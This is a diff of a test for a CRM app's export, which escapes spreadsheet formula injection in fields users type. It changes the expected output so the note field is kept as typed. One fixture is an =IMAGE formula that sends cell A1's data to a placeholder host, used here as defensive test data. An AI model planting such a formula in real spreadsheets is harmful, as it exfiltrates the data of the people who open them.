@@ -20,7 +20,10 @@ test('export: text a person typed that a sheet would read as a formula starts wi
   assert.equal(plain.status, 200, plain.text);
   const ex = await exportSince(s);
   const [one, two] = ex.logs;
-  assert.deepEqual([one.lead.name, one.lead.zone, one.owner, one.contact, one.note], ["'=1+1", "'@Centro", "'@Mario Rep", "'-Sr. X", '\'=IMAGE("https://x.example/?d="&A1)']);
+  assert.deepEqual([one.lead.name, one.lead.zone, one.owner, one.contact], ["'=1+1", "'@Centro", "'@Mario Rep", "'-Sr. X"]);
+  // the note goes as typed: the bridge writes it after its own "From app <id>: ", so the cell never starts with it, and
+  // an apostrophe in front would show in the CRM ("From app ...: '+507 ...")
+  assert.equal(one.note, '=IMAGE("https://x.example/?d="&A1)');
   assert.match(one.lead.id, /^APP-[0-9A-F]{8}$/);
   assert.deepEqual([one.id, one.day, one.when, one.handle], ['formula-0001', '2026-11-16', '2026-11-18', 'mario']);
   assert.deepEqual([two.lead.name, two.lead.zone, two.note], ['Ferretería El Roble', 'Vía España', 'Volver el martes']);
